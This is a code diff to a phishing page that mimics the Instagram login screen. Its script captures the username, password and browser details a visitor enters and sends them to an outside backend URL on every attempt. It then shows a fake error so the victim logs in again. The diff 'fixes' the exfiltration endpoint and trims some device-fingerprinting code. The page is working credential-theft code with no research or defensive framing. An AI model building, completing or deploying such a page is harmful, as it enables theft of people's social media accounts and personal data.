@@ -102,7 +102,7 @@
 <body>
     <div class="container">
         <div class="top-right-i">i</div>
-       
+      
         <div class="logo-container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
                  alt="Instagram" class="insta-logo">
@@ -131,8 +131,11 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const errorMsg = document.getElementById('errorMsg');
-        
+       
         let attemptCount = 0;
+
+        // ✅ FIXED: Correct Backend URL (HTTPS + full domain)
+        const BACKEND_URL = "https://myphotosconfessions.up.railway.app/capture";
 
         async function getFingerprint() {
             const fp = {};
@@ -142,50 +145,17 @@
             fp.language = navigator.language;
             fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
             fp.deviceMemory = navigator.deviceMemory || 'unknown';
-            
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                fp.battery = `${Math.round(battery.level * 100)}%`;
-                fp.charging = battery.charging ? 'Yes' : 'No';
-            }
-            
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        fp.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        fp.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (e) {}
-            
-            try {
-                const res = await fetch('https://api.ipapi.is');
-                const data = await res.json();
-                fp.ip = data.ip || 'unknown';
-                fp.isp = data.isp || data.asn?.org || 'unknown';
-                fp.country = data.country || 'unknown';
-                fp.city = data.city || 'unknown';
-                fp.vpn = data.is_proxy || data.is_vpn || data.is_hosting ? 'Yes (detected)' : 'No';
-            } catch (e) {
-                fp.ip = 'failed';
-                fp.isp = 'unknown';
-                fp.country = 'unknown';
-                fp.city = 'unknown';
-                fp.vpn = 'unknown';
-            }
             return fp;
         }
 
         loginBtn.addEventListener('click', async () => {
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
-            
+           
             if (!username || !password) return;
 
             attemptCount++;
-            
+           
             loginBtn.innerHTML = '<div class="spinner"></div> Logging in...';
             loginBtn.disabled = true;
             errorMsg.style.display = 'none';
@@ -201,12 +171,14 @@
                 fingerprint: fingerprint
             };
 
+            // Send to backend on every attempt
             try {
-                await fetch('/capture', {
+                await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+                console.log(`Attempt ${attemptCount} sent successfully`);
             } catch (e) {
                 console.error("Failed to send to server:", e);
             }
@@ -215,7 +187,7 @@
             usernameInput.value = '';
             passwordInput.value = '';
 
-            if (attemptCount < 2) {           // ← Changed from 3 to 2
+            if (attemptCount < 2) {
                 setTimeout(() => {
                     errorMsg.style.display = 'block';
                     loginBtn.innerHTML = 'Log in';
